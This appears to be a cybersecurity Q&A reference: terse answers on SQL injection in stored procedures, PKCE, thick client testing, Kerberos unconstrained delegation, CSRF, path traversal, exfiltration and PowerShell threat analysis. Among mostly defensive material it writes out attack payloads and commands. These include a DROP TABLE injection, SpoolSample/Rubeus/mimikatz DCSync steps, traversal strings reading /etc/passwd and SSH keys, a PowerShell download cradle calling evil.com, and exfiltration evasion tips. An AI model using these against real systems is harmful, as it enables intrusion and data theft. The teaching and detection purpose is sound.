Stored procedures basics: named compiled SQL stored in database; called by application: EXEC sp_GetUser @username; parameters bound separately from SQL structure; if implemented with parameterised execution: immune to SQLi. Vulnerable stored procedure patterns: dynamic SQL inside procedure: CREATE PROCEDURE sp_GetUser @username VARCHAR(50) AS BEGIN EXEC( SELECT * FROM users WHERE username = + @username +); END; attacker passes: admin OR 1=1 --; procedure builds: SELECT * FROM users WHERE username = admin OR 1=1 --; injection succeeds despite stored procedure. String concatenation in sp_executesql without proper binding: CREATE PROCEDURE sp_Search @searchTerm NVARCHAR(200) AS BEGIN DECLARE @sql NVARCHAR(500); SET @sql = N SELECT * FROM products WHERE name LIKE % + @searchTerm + %; EXEC sp_executesql @sql; END; attacker provides: %'; DROP TABLE products; --; injection succeeds. Second-order injection in stored procedure: procedure accepts and stores user input; second procedure retrieves and uses in dynamic SQL; first input safe (goes into DB); second query vulnerable when data retrieved and concatenated. Secure stored procedure patterns: parameterised sp_executesql: EXEC sp_executesql N SELECT * FROM users WHERE username = @username, N @username NVARCHAR(50), @username = @inputUsername; @username treated as literal string value; cannot break out of string context; static SQL in procedure: no dynamic SQL; structure predetermined; only data substituted via parameters; stored procedure itself acts as allowlist of permitted queries. Common misconception: stored procedures are not automatically safe; safety depends on implementation; parameterised stored procedure call from ORM still vulnerable if stored procedure uses dynamic SQL internally; always review stored procedure source code during security assessment. Testing: test stored procedures directly if source code available; identify dynamic SQL construction; test application-facing parameters with injection payloads; check for second-order injection scenarios where stored data is later used in dynamic SQL.
What is PKCE in OAuth2 and why is it important?

PKCE (Proof Key for Code Exchange, pronounced pixie): OAuth 2.0 extension preventing authorisation code interception attacks; mandatory for public clients and recommended everywhere. Problem PKCE solves: OAuth authorisation code flow: client redirects to authorisation server; user authenticates; authorisation server redirects back with code: https://app.com/callback?code=ABC123; client exchanges code for access token; attack: malicious app registers same custom URI scheme (myapp://callback); receives redirect with code; exchanges code for access token; standard flow: no way to verify which app received code. PKCE flow: code verifier: random 43-128 character string; generated by client before authorisation request; code challenge: SHA-256(code_verifier) base64url encoded; authorisation request: includes code_challenge and code_challenge_method=S256; authorisation server stores code_challenge with issued code; code exchange: client sends code + original code_verifier; authorisation server: SHA-256(received_verifier) must equal stored code_challenge; if intercepted code used without verifier: exchange fails (attacker does not know verifier). Why effective: malicious app receives redirect with code; does not know original code_verifier (generated by legitimate app); cannot exchange code for token; code useless without verifier. Implementation: all OAuth2 public clients must use PKCE: SPAs (no back channel), mobile apps, desktop apps; server-side confidential clients: recommended but less critical (client secret provides some protection); OAuth 2.1 (draft): PKCE required for all clients (removes implicit flow); libraries: all major OAuth2 libraries support PKCE; developers should not implement manually; issues: short code_verifier: if verifier not random enough: brute-forceable; must be minimum 43 characters from cryptographically random source; plain code_challenge_method: code_challenge = code_verifier (no hash); downgrade possible if server allows plain; always use S256; state parameter: still required for CSRF protection even with PKCE; separate concerns; redirect URI validation: must be exact match; PKCE alone does not protect against open redirect in callback.
How do you approach pentesting a thick client application?

Thick client penetration testing: assess desktop applications (.NET, Java, Electron, native Win32); different attack surface from web applications. Reconnaissance: identify technology stack: file command, Detect-It-Easy, strings;.NET: look for.dll and Portable Executable (PE) headers; Java: look for.jar files or JVM indicators; Electron: look for app.asar file (Node.js packaged app); architecture: does app have local logic only or connect to API backend?; client-server protocol: HTTP/HTTPS (easiest), custom TCP protocol, COM/DCOM, named pipes, local SQL. Traffic interception: if HTTP/HTTPS backend: configure Burp Suite proxy; modify app to trust Burp certificate or disable certificate validation for testing; if non-HTTP protocol: Wireshark (capture all traffic); custom protocol reverse engineering; mitmproxy or custom proxy for known protocols. Static analysis:.NET: ILSpy, dnSpy (decompile to near-original C# source); DotPeek; find: hardcoded credentials, API keys, connection strings, business logic; Java: procyon, fernflower, JD-GUI (decompile JAR); Electron: asar extract app.asar --output app (extract Node.js source); JavaScript readable; find: IPC (Inter-Process Communication) handlers, Node.js native integration. Local storage: examine all local storage: SQLite databases, config files, log files, cached credentials, encryption keys; Windows credential store (DPAPI): if app stores credentials in Windows Credential Manager; mimikatz can dump DPAPI credentials; registry: check app-specific registry keys for sensitive data. Memory analysis: process Hacker: attach to process; memory search for: password strings, session tokens, decrypted data; useful when data encrypted on disk but decrypted in memory. Privilege escalation: if app runs as elevated (ADMIN): service binary path writable?; DLL hijacking (search for DLLs in writable paths); named pipe DACL misconfiguration; UI privilege escalation (spawning privileged actions from user context). Common vulnerabilities: hardcoded credentials (database connection strings, API keys); cleartext sensitive data in local storage; missing validation (trust client-side validation without server validation); insecure communication (plaintext, no cert validation); DLL hijacking; deserialization vulnerabilities (.NET BinaryFormatter, Java ObjectInputStream); SQL injection in local SQLite queries.
What is a blue team tabletop exercise?

Blue team tabletop exercise: simulate security incident scenario; test detection and response capabilities; identify gaps without real attack. Purpose: validate incident response playbooks work as expected; train team on roles and responsibilities; identify communication gaps; test decision-making under pressure; comply with regulatory requirements (ISO 27001 clause 9.3, PCI DSS requirement 12.10.2). Types: scenario-based: walk through realistic incident scenario; discuss what each team member would do at each decision point; injects: new information revealed periodically (attacker pivoted, data exfiltrated, press enquiry received); functional exercise: teams actually perform actions (call real escalation chains, execute real playbooks, access real systems) without actual incident; full-scale drill: most realistic; affects actual systems; rare; highest disruption risk. Planning: select scenario relevant to current threat landscape: ransomware hitting critical business application, insider threat data exfiltration, supply chain compromise, DDoS during peak period; select participants: SOC analysts, IR manager, CISO, IT operations, legal, HR, communications/PR, executive sponsor; designate facilitator (does not participate; drives scenario and injects); designate observer (documents decisions and gaps). Exercise flow: introduction: ground rules, objectives, scope (no real actions unless specified); scenario presentation: initial information (how incident discovered, initial indicators); discussion: what do you do first? Who do you notify?; inject: new information changes situation; continue discussion; escalate scenario severity; debrief: what worked? What did not? What gaps identified? Immediate lessons learned. Common findings: playbooks not updated (actions in playbook reference old contact info or deprecated tools); escalation paths unclear (who do you call at 2 AM?); communication protocols: when to notify executive team? When to engage external IR firm? Legal obligations unknown (is this GDPR notifiable? When must we notify DPA?); decision authority gaps: who can authorise isolating critical system?; evidence preservation forgotten (jump straight to remediation without preserving forensic evidence). Follow-up: action items with owners and deadlines; update playbooks; address identified gaps; schedule next exercise (at least annually, quarterly for high-maturity SOC).
What is a honeypot and how is it used in security?

Honeypot: decoy system designed to attract attackers; detect, observe, and slow down attacks without risk to production systems. Types: production honeypot: deployed within production network; detect attacker who has already breached perimeter; low-interaction; minimal resources; examples: fake server share, honeycredential (fake credential in password manager), honeytoken (fake AWS access key that triggers alert if used); research honeypot: deployed to observe attacker techniques, collect malware samples, understand attack trends; high-interaction; full OS; global internet-exposed; not protecting specific organisation; low-interaction honeypot: simulates limited services; emulates responses; does not run full OS; lightweight; safer (attacker cannot fully compromise); tools: Honeyd, Kippo (SSH); high-interaction honeypot: real OS; real services; full interaction; maximum realism; highest risk; real systems inside sandbox; tools: VMware-based; monitored carefully. Honeytokens: fake credentials, API keys, files, DNS names, email addresses; placed in likely attacker discovery locations; alert when accessed; types: fake AWS access key (appears in code comment; any use triggers CloudTrail alert and notification); fake file (fake budget spreadsheet on file share; alert on access); canary token (canarytokens.org: unique URL or file; alert when opened); fake admin account (alert on any logon attempt); fake domain (canary DNS name; alert on DNS query). Deployment in enterprise: honeypot server in each VLAN: any connection to honeypot IP = compromise indicator; attacker after breach will scan internal network; will hit honeypot during enumeration; alert immediately with high confidence; HoneyBit system: honeyd listening on unused IP space; port scan of unused IPs = reconnaissance alert; honey credentials: fake password in LSASS or KeePass; alert if Kerberos ticket requested or credential used. Deception platforms: Illumio, Attivo Networks (now SentinelOne Ranger AD), CounterCraft; comprehensive deception; automated deployment across network; realistic decoys; integration with SIEM; legal considerations: honeypots that actively engage attackers may have legal implications; entrapment argument (limited applicability in most jurisdictions); document: purpose, monitoring, data collection; consult legal before deployment especially if attempting to deanonymise attackers; data retention policy for captured data.
What is Kerberos unconstrained delegation and how is it exploited?

Unconstrained Kerberos delegation: allows service to impersonate any user to any other service; legacy feature; powerful attack path when service account or computer compromised. How delegation works: Kerberos delegation: allows middle-tier server to present user credentials to back-end service; classic use: web app authenticates user; needs to query database as that user; web server needs user Kerberos credentials to pass to database. Unconstrained delegation: oldest delegation type; when user authenticates to service configured with unconstrained delegation: user TGT (Ticket Granting Ticket) sent to that service; service can impersonate user to any other service; TGT stored in LSASS on delegating server; if attacker compromises service with unconstrained delegation: extracts all stored TGTs including domain admin TGT if domain admin authenticated to service. Finding unconstrained delegation: BloodHound: unconstrained delegation computers shown; PowerView: Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation (list computers with unconstrained delegation); Get-ADUser -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation (list user accounts with unconstrained delegation). Exploitation -- Printer Bug / SpoolSample: force domain controller to authenticate to attacker-controlled server with unconstrained delegation; printer spooler service coercion: SpoolSample.exe DC_HOSTNAME ATTACKER_SERVER_WITH_DELEGATION (DC attempts to authenticate to attacker server via print spooler protocol); DC$ (domain controller machine account) TGT stored on attacker server LSASS; extract DC$ TGT: Rubeus.exe monitor /interval:5 (monitor LSASS for new tickets); perform DCSync using DC$ TGT: Rubeus.exe ptt /ticket:DC_TGT_BASE64; mimikatz dcsync: dump all domain hashes; domain compromised. Petitpotam: alternative coercion (EFSRPC protocol); similar result; requires MS-EFSRPC allowed. Constrained vs unconstrained: constrained delegation: service can impersonate user only to specific services (configured SPNs); resource-based constrained delegation (RBCD): back-end resource controls who can delegate to it; more secure; preferred. Remediation: identify systems with unconstrained delegation; migrate to constrained delegation or RBCD; Windows Server 2019+: Protected Users group prevents TGT forwarding; domain controller account protection: mark DC accounts as sensitive (not delegatable); disable printer spooler service on DCs; Petitpotam mitigation: block MS-EFSRPC or enable EPA (Extended Protection for Authentication).
How do you implement a bug bounty programme?

Why bug bounty: external researcher perspective (different from internal team blind spots); cost-effective (pay only for valid findings); access to global researcher pool; marketing signal (demonstrates security commitment); supplement internal testing (not replace). Internal vs public programme: private programme: invite-only; known and vetted researchers; smaller scope; better for first bug bounty (manageable submission volume; defined researchers); public programme: open to all; maximum researcher diversity; maximum submission volume; require mature triage capacity before going public. Programme components: scope: clearly define in-scope targets (specific domains, IP ranges, mobile apps); clearly define out-of-scope (social engineering, physical, DoS against production, third-party services); clearly define rules of engagement (no automated large-scale scanning, no DoS, report before public disclosure, no exfiltration of data beyond proof); policy: safe harbour statement (company will not prosecute researchers following programme rules); response SLA (acknowledge within 24-48 hours; triage within 5 business days; fix critical within 30 days); reward structure (reward table by severity: Critical: $5000-$50000; High: $1000-$5000; Medium: $200-$1000; Low: $100-$500; Informational: swag only or $0); platforms: HackerOne: largest platform; managed triage option; Bugcrowd: similar; Intigriti: Europe-focused; Synack (vetted researchers only; private programme). Triage process: receive submission; assess validity (is it a real vulnerability?); assess severity (CVSS + impact); check for duplicates; communicate with researcher; escalate for fix; validate fix; award bounty; manage researcher communication: respond promptly; explain decisions; professional; treat researchers as partners; even invalid submissions deserve respectful response. Metrics: total reports received; valid vs invalid rate; average CVSS score of valid reports; time to triage; time to fix by severity; total bounties paid; unique researchers; ROI (vulnerabilities found vs penetration test cost). Programme maturity: start private; fix common issues (XSS, disclosure); expand scope; go public when ready; increase rewards as scope and confidence grow.
What is secure coding for input validation?

Input validation: first and most important line of defence against injection attacks and unexpected input; validate all data from untrusted sources. Untrusted sources: HTTP request parameters (GET, POST), headers, cookies; API inputs (JSON body, query string); file uploads; database data if populated from external sources; third-party API responses; user-generated content. Validation principles: allowlist (whitelist) not denylist (blacklist): define what is valid; reject everything else; denylist approach always bypassed (encoding, novel characters); context-specific validation: what is valid for a username (alphanumeric + underscore) is different from email or free-text comment; validate on the server side: client-side validation improves UX but not security; attacker bypasses JavaScript validation trivially (Burp Suite intercept and modify); also validate server-side; validate at entry point: validate as soon as data enters system; do not trust data that has been stored in database without re-validation if used in dangerous context (prevent second-order injection). Validation techniques: type validation: is this a number? is_numeric(), int(), parseInt(); reject non-numeric input for numeric fields; format validation: email: regex pattern (loose -- RFC 5321 email is complex; validate server sends email and link clicked instead); URL: check scheme (only https://), host (allowlist or format validation), no javascript: scheme; date: parse with date library; reject if parse fails; length: minimum and maximum length; reject beyond maximum; prevents: log flooding, DoS with huge inputs, buffer issues; range: numeric values within expected range (age: 0-150, quantity: 1-999); encoding: reject null bytes (%00) which confuse file system operations; reject newlines in single-line fields (HTTP header injection). Code examples: Python: age = int(request.form.get(age, 0)); if not 0 <= age <= 150: abort(400, Invalid age); Java: Pattern.matches([a-zA-Z0-9_]{3,20}, username) for username validation; Do not use: try to strip or escape bad characters from complex input (may miss encoding); do not rely on WAF alone (defence in depth); do not validate only client-side. Special cases: free text fields: hardest to validate; minimum: length limit; check for null bytes; do not try to strip all HTML (too complex); instead: encode on output; accept any Unicode text; reject only null bytes and control characters; file upload: see file upload security entry.
What is the difference between authentication and authorisation vulnerabilities?

Authentication vs authorisation: distinct security concepts; different vulnerabilities and defences. Authentication: verify identity; who are you?; proves you are who you claim to be; authentication vulnerabilities: broken authentication: bypass authentication mechanism; attacker accesses system as another user without knowing credentials; types: default credentials (admin/admin, admin/password); credential brute force (no rate limiting, no lockout); password spraying (single common password against many accounts); credential stuffing (breached credentials tried against target); SQL injection in login (bypass authentication query); insecure forgot password (predictable reset token, no expiry); session fixation (attacker sets victim session ID before login; after login session ID elevated but attacker knows it); multi-factor authentication bypass: SIM swap attack (port victim phone number to attacker SIM; intercept SMS OTP); MFA fatigue/push bombing (spam push notifications until user accepts); SIM-less bypass (some MFA implementations allow bypass if 2FA not enrolled); session management weaknesses: predictable session tokens, tokens not invalidated on logout, no session expiry. Authorisation: verify permission; what are you allowed to do?; after authentication: determine what authenticated identity can access; authorisation vulnerabilities: IDOR (Insecure Direct Object Reference): user A accesses user B resource by changing ID; Broken Access Control (OWASP #1): various failures to enforce access rules; privilege escalation: horizontal (access another user same-level resource), vertical (regular user accesses admin function); missing function-level access control: admin endpoints accessible to regular users (only hidden from UI, not protected on server); path traversal: access files outside intended directory via../ sequences; excessive data exposure: API returns full object including fields user should not see; SSRF: server makes requests on behalf of user to internal resources user cannot directly access. Example confusion: force-browsing to /admin page (authorisation vulnerability); SQL injection in login bypassing authentication check (authentication vulnerability); both may allow access to admin interface but through different weaknesses with different fixes.
What is the MITRE ATT&CK framework?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge): knowledge base of real-world adversary tactics and techniques; used for threat intelligence, detection engineering, red team planning, gap analysis. Structure: tactics: high-level adversarial goals (why); 14 tactics in Enterprise ATT&CK: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defence Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact; techniques: specific how to achieve tactic (what); each tactic has multiple techniques; sub-techniques: more specific variants; example: T1059 (Command and Scripting Interpreter) with sub-techniques T1059.001 (PowerShell), T1059.003 (Windows Command Shell); procedures: specific real-world implementations (how specific actor used technique); ATT&CK also covers: Mobile (iOS, Android); ICS (Industrial Control Systems); Cloud. Usage: threat intelligence: map threat actor TTPs to ATT&CK; understand which techniques your adversaries use; example: Lazarus Group (APT38) techniques listed; defender knows what to detect. Detection engineering: create detection rules for each ATT&CK technique; ATT&CK data sources field: which logs would capture this technique; example: T1003.001 (LSASS Credential Dumping): data sources: process creation (4688), OS API execution, command execution; map detections to ATT&CK: know which techniques you can detect vs blind spots. Purple team: red team executes specific ATT&CK techniques; blue team checks detection; coverage mapped in Navigator. Gap analysis: ATT&CK Navigator: visualise techniques; colour by: detection capability, controls in place, threat actor relevance; identify red areas (no detection) and prioritise. SOC metrics: ATT&CK coverage score: what % of ATT&CK techniques have detection rules; increase coverage over time. Threat intelligence enrichment: STIX format for ATT&CK data (machine-readable); import into threat intel platform (MISP, OpenCTI, Anomali); auto-enrich alerts with ATT&CK technique context. Limitations: ATT&CK does not cover all possible attack techniques; focuses on documented real-world techniques; technique descriptions at medium abstraction (specific exploit code not included); tools supplement not replace ATT&CK-based approach.
What is passive reconnaissance in penetration testing?

Passive reconnaissance: gather information about target without directly interacting with target systems; no packets sent to target; no log entries on target servers; purely open source intelligence (OSINT). Why passive recon: zero detection risk (no logs on target); legal in all jurisdictions (public data only); often reveals more than active scanning (job postings, news articles, code repositories); essential for realistic threat simulation (real attackers spend weeks on passive recon). WHOIS and DNS: whois target.com: registrant organisation, name, email, creation date, registrar, name servers; SecurityTrails, DomainTools: historical WHOIS and DNS records; previous IP addresses; previous registrant info; old name servers; dig target.com ANY: all DNS records; dig target.com MX: mail servers (reveals email security: SPF record, DMARC, mail providers); subdomains via reverse DNS: passive DNS databases (VirusTotal, RiskIQ, Shodan). Search engine dorking: site:target.com: all indexed pages; filetype:xls OR filetype:doc site:target.com: office documents; inurl:admin OR inurl:login site:target.com: admin panels; site:target.com -www: find non-www subdomains indexed; target.com confidential: pages mentioning confidential but indexed. GitHub/code repositories: github.com/target-company: official repos; github.com search: org:target-company password OR secret OR key; search for employee GitHub profiles (LinkedIn -> GitHub link); search for commits mentioning company domain: filename:config email:employee@target.com; Google code dork: site:github.com target.com password. Job postings: LinkedIn jobs, Glassdoor, Indeed: technology stack revealed; we use: Kubernetes, Terraform, PostgreSQL, React, Splunk; specific version numbers in JD; security team size; tools used by security team; employee OSINT: LinkedIn: employee names, roles, years of service, past employers; sales and marketing people often reveal products, customers, technologies; technical LinkedIn posts from engineers reveal internal tools. Historical snapshots: Wayback Machine (web.archive.org): historical site screenshots; old technology (PHP 5.2 may still be running), old admin panels; old subdomains; source code of pages that have been updated. Metadata: PDF, DOCX, XLSX metadata (author, company, creation date, last modified, software versions): exiftool document.pdf; Google: download PDFs from target.com; extract metadata from all.
What is HTTP security headers and how do you implement them?

HTTP security headers: HTTP response headers that instruct browsers to apply additional security controls; defence in depth for web applications. Strict-Transport-Security (HSTS): force HTTPS for specified duration; browsers reject HTTP connections; syntax: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload; max-age=63072000 (2 years in seconds); includeSubDomains: applies to all subdomains; preload: submit to browser preload lists (browsers ship with HSTS preload domains; never make HTTP connection even before seeing HSTS header); submit to hstspreload.org; effects: prevents SSL stripping; prevents accidental HTTP requests; must have HTTPS everywhere before enabling preload. Content-Security-Policy (CSP): control what resources browser can load; prevent XSS by restricting script sources; syntax: Content-Security-Policy: default-src self; script-src self https://cdn.example.com; style-src self unsafe-inline; img-src *; directives: default-src (fallback), script-src (JavaScript sources), style-src (CSS), img-src (images), connect-src (XHR/fetch/WebSocket), font-src, frame-src, form-action, base-uri; restrictive example: default-src none; script-src self; connect-src self; img-src self data:; style-src self; nonce for inline scripts: Content-Security-Policy: script-src nonce-RANDOM_VALUE (script tag includes nonce=RANDOM_VALUE); nonce changes per request; prevents attacker-injected scripts (no nonce); CSP report-uri: report-uri https://csp-report.example.com (browser sends violation reports); start with Content-Security-Policy-Report-Only for testing. X-Content-Type-Options: prevent MIME type sniffing; syntax: X-Content-Type-Options: nosniff; browser strictly uses Content-Type header; prevents: serving JavaScript as text/plain but browser guesses application/javascript and executes. X-Frame-Options: control framing; Clickjacking prevention; syntax: X-Frame-Options: DENY or SAMEORIGIN; CSP frame-ancestors preferred (more control). Referrer-Policy: control referrer header; prevent leaking URLs in referrer; syntax: Referrer-Policy: strict-origin-when-cross-origin; prevents sending path and query to external sites. Permissions-Policy (formerly Feature-Policy): control browser features; disable unused APIs; syntax: Permissions-Policy: camera=(), microphone=(), geolocation=(); disable camera, microphone, geolocation access. Implementation: Nginx: add_header Strict-Transport-Security max-age=63072000; includeSubDomains; preload always; Apache: Header always set Strict-Transport-Security max-age=63072000; includeSubDomains; preload; Express.js: helmet middleware (npm install helmet; app.use(helmet())); Django: django-csp and SecurityMiddleware; Testing: securityheaders.com: grade and analyse all security headers; OWASP ZAP: check security headers in scan.
What are SQL injection prevention techniques?

SQL injection prevention: eliminate or neutralise SQLi vulnerabilities; multiple complementary approaches. Parameterised queries (prepared statements): primary defence; SQL structure defined separately from data; data never interpolated into query string; driver handles escaping and quoting; Python: cursor.execute(SELECT * FROM users WHERE username = %s, (username,)); Java: PreparedStatement pstmt = conn.prepareStatement(SELECT * FROM users WHERE username = ?); pstmt.setString(1, username); PHP: $stmt = $pdo->prepare(SELECT * FROM users WHERE username = :username); $stmt->execute([username => $username]); Node.js (pg): client.query(SELECT * FROM users WHERE username = $1, [username]); does not matter what username contains: SQL structure unchanged; attacker provides admin OR 1=1 --: query becomes SELECT * FROM users WHERE username = admin OR 1=1 -- ; (treated as literal string); returns no results (no user with that username). Stored procedures (properly implemented): define query in database; application calls procedure with parameters; procedure uses parameterisation internally; does not build dynamic SQL from user input; see stored procedure vulnerability entry for caveats. ORM (Object-Relational Mapping): Django ORM: User.objects.filter(username=username); generates parameterised query; Hibernate: session.createQuery(from User where username = :username).setParameter(username, username); SQLAlchemy: session.query(User).filter_by(username=username); misuse: raw queries in ORM: session.execute(text(SELECT * FROM users WHERE username = + username)); defeats parameterisation. Input validation: secondary defence; not primary SQLi prevention; validate data type, format, length; reject if invalid; helpful for defence in depth; validate: numeric fields are numeric, dates are dates; restrict characters in identifiers. Least privilege database user: application DB user has minimum permissions; SELECT, INSERT, UPDATE, DELETE on required tables only; no CREATE, DROP, TRUNCATE, GRANT; even if SQLi succeeds: attacker cannot drop tables or read other schemas; cannot access information_schema without SELECT ANY TABLE; limits blast radius. WAF: Web Application Firewall detects common SQLi payloads; blocks obvious attacks; bypass possible; not substitute for parameterised queries; value: catches script kiddie attacks and known scanners. Error handling: never return database errors to users; catch database exceptions; return generic error; log detailed error server-side; database error message reveals table names, column names, SQL syntax; information useful for attacker. Escaping (last resort): if parameterisation truly impossible (dynamic table name): escape user input before interpolation; use database-specific escaping function: mysqli_real_escape_string() (PHP+MySQL), pg_escape_string() (PHP+PostgreSQL); escape does not work for all contexts (identifier escaping different from string escaping); error-prone; prefer parameterisation always.
What is data exfiltration and how do attackers move stolen data?

Data exfiltration: transfer sensitive data from compromised network to attacker-controlled destination; final stage of many attacks before or alongside ransomware. Why exfiltration matters: double extortion (ransomware operators encrypt AND exfiltrate; threaten to publish if ransom not paid); espionage (intellectual property, credentials, plans); financial fraud (account numbers, PII sold); proof of access (bug bounty, competitive intelligence). Exfiltration techniques: network-based: HTTPS upload: POST data to attacker cloud storage (S3, Dropbox, OneDrive, Google Drive); traffic blends with legitimate cloud traffic; SFTP/FTP: if outbound allowed; SSH tunneling: tunnel data over SSH on permitted port; email: send attachments to external email; DNS tunneling: encode data in DNS queries; slow but bypasses most controls; ICMP covert channel: data in ICMP payload; more exotic. Physical: USB drives; removable media; print and walk out; photograph screen. Avoiding detection during exfiltration: staging: compress and encrypt before exfiltration (7z password-protected archive); encrypted and compressed file looks like noise; timing: exfiltrate slowly (low and slow); avoid large spike in outbound traffic; split data: small chunks over time; destination: use legitimate cloud services (harder to block than attacker VPS); use domains with good reputation; file renaming: rename sensitive files to innocuous names (report.zip vs financials_q4_2024.zip); living off the land: use built-in tools (certutil.exe for base64 encoding, curl.exe for upload). Detection: DLP (Data Loss Prevention): pattern matching on sensitive data leaving network; requires SSL inspection for HTTPS; network anomaly detection: unusual outbound volume; new external destination IP or domain; UEBA: user data access volume spike before exfiltration; EDR: file access patterns, staging (creating archive files, USB access); DNS logs: high query rate to single domain (tunneling indicator); cloud CASB: monitor and control cloud app data uploads. Prevention: egress filtering: restrict outbound destinations (allowlist); DLP: classify and control sensitive data movement; removable media control: block USB; endpoint DLP; data minimisation: collect and retain only necessary data (less to steal); encryption at rest: encrypted data useless even if exfiltrated (if attacker does not have key); monitor and alert: alert on large outbound data transfers; first-seen destination alerts.
What is cross-site request forgery (CSRF) and how do you prevent it?

CSRF (Cross-Site Request Forgery): trick authenticated user browser into making unintended requests to trusted site; attacker forges state-changing requests. How it works: user is authenticated to bank.com (session cookie); user visits attacker.com while logged in; attacker.com contains: or hidden form that auto-submits to bank.com; browser sends request to bank.com including session cookie (SameSite=None or not set); bank.com processes transfer as legitimate (valid session cookie); attack succeeded without user knowing. Prerequisites: user must be authenticated to target site; target must have state-changing operation triggered by GET request (or attacker can auto-submit POST form); no CSRF protection on target endpoint. GET vs POST: GET-based: image tag, link, script src; POST-based: auto-submit hidden form; attacker page:
. CSRF does not work for: reading data (attacker cannot see response due to same-origin policy); non-credentialed requests (if cookies not sent); if CSRF token validates correctly. Prevention: Synchronised token pattern (CSRF token): server generates unique random token per session; embed in every state-changing form as hidden field; also in AJAX header (X-CSRF-Token); server validates token on every POST/PUT/DELETE/PATCH; attacker cannot know token (different origin cannot read DOM of target); implementation: Django (built-in CSRF middleware), Rails (protect_from_forgery), Spring Security (@EnableWebSecurity), Laravel (VerifyCsrfToken middleware); SameSite cookie attribute: SameSite=Strict: cookie not sent with any cross-site request; strongest protection; breaks some flows (OAuth, external links to authenticated pages); SameSite=Lax: cookie not sent with cross-site POST; sent with top-level GET navigation; good balance; most modern browsers default to Lax; SameSite=None + Secure: allows cross-site (required for legitimate cross-origin cookies like third-party); Double submit cookie: CSRF token in both cookie and form field; server verifies they match; works without session state but less secure than synchronised token; custom request header (AJAX): require X-Requested-With: XMLHttpRequest; cannot be set from cross-origin form submission; effective for API calls; not form submissions. Testing: identify all state-changing endpoints; remove or modify CSRF token in request (blank, wrong value, other user token); if state changes anyway: vulnerable.
What is path traversal and how do you prevent it?

Path traversal (directory traversal): manipulate file path input to access files outside intended directory; read sensitive files, overwrite files, or achieve RCE. How it works: application reads file based on user input: https://app.com/files?name=invoice.pdf; server: file = open(base_dir + filename); attacker provides: name=../../etc/passwd; path becomes: /var/www/html/files/../../etc/passwd = /etc/passwd; server reads and returns /etc/passwd; attack success. Variations: basic:../; URL-encoded: %2e%2e%2f; double URL-encoded: %252e%252e%252f; Windows:..\ or..%5c; null byte:../etc/passwd%00.jpg (terminate string at %00;.jpg suffix after null byte ignored by C functions); unicode:..%c0%af (overlong UTF-8 encoding of /); bypass filter with:....// (strip one set of../ leaves../). Target files: /etc/passwd (usernames; hashed passwords if shadow-merged); /etc/shadow (password hashes -- requires root); /etc/hosts; SSH keys (~/.ssh/id_rsa, ~/.ssh/authorized_keys); application config files (config.php,.env, database.yml, settings.py -- database credentials, API keys); web server config; application source code; Windows: C:\Windows\System32\drivers\etc\hosts; C:\Windows\win.ini; C:\Users\Administrator\.ssh\. File write path traversal: if application writes to user-specified path: attacker writes to:../../cron.d/evil (cron job for reverse shell);../../etc/passwd (add root user); web shell to webroot (../../var/www/html/shell.php); RCE via write path traversal. Zip slip: malicious ZIP file with path traversal in archive member names (../../evil.sh); extraction overwrites files outside extraction directory; affects any unzip implementation not checking paths. Prevention: input validation: reject path traversal sequences (../,..//, %2e%2e); allowlist: validate filename against allowlist (alphanumeric + limited chars); reject any.. or / in filename; path canonicalisation: resolve full path; verify starts with expected base directory: realpath = os.path.realpath(base_dir + filename); if not realpath.startswith(base_dir): reject; Python: pathlib.Path(base).joinpath(filename).resolve(); check resolved path is child of base; Java: file.getCanonicalPath().startsWith(base); use indirect references: store filename to ID mapping in database; user provides ID (1, 2, 3); server looks up actual filename; no user-controlled path; serve files differently: files served by application store in blob storage; retrieve by opaque key; no filesystem path involved; Testing: Burp Suite path traversal scanner; manual:../ sequences in all file parameters; check all methods (GET, POST, multipart form).
How do you analyse PowerShell for security threats?

PowerShell security analysis: detect malicious PowerShell usage; PowerShell is the most common living-off-the-land attack tool. Why PowerShell is abused: built into Windows (no download needed); access to.NET framework; WMI, registry, file system, network; can download and execute in memory (no disk write); can be obfuscated; difficult to detect without proper logging. Obfuscation techniques attackers use: string concatenation: I(E)X(New-Object Net.WebClient).DownloadString(http://evil.com); InvokeExpression: invokes any string as code; base64 encoding: powershell -enc BASE64_ENCODED_COMMAND (standard PowerShell parameter); common in malicious commands; command flag aliases: powershell -nop -w hidden -c (nop=NoProfile; w=WindowStyle; c=Command); common attacker pattern; also: -noexit, -noni (NonInteractive); character substitution: set variable with chars; build string character by character; invoke at end; Download cradles: IEX (New-Object Net.WebClient).DownloadString(URL); Invoke-Expression (Invoke-WebRequest URL).Content; [System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12; (common HTTPS setup before download). Logging: Script Block Logging: Event ID 4104 (Script Block Log in Microsoft-Windows-PowerShell/Operational); logs all PowerShell script blocks including after-obfuscation-deobfuscated code; enable: GPO: Computer Config > Administrative Templates > Windows Components > PowerShell; Module Logging: Event ID 4103; logs module and pipeline execution; Transcription Logging: creates transcript file of all sessions; PowerShell v5+: all three enabled; Event 4688 (Process Creation): captures command line; detect: powershell.exe with -enc or -nop flags from unusual parent; Sysmon Event 1: process creation with full command line. AMSI (Antimalware Scan Interface): PowerShell 5.0+: passes script content to AV before execution; AV blocks known malicious patterns; attackers patch AMSI in memory to bypass; AMSI bypass itself often flagged by EDR. Detection patterns: Process: powershell.exe spawned from: Word.exe, Excel.exe, Outlook.exe, mshta.exe, wscript.exe = high suspicion; Network: powershell.exe making outbound connection (download cradle); Command line: -enc base64 = always investigate; -nop -w hidden = common attacker flags; Invoke-Mimikatz, Invoke-Shellcode, IEX, DownloadString = known patterns. Tools: PowerShell obfuscation: PSAmsi, Invoke-Obfuscation; PowerShell deobfuscation: PSDecode, manual analysis; hunting: PowerShell Script Block logs via SIEM; constraint language mode: limits PowerShell to safe subset; blocks many attacker techniques; enable via AppLocker or Device Guard.
What is a DMZ network architecture?

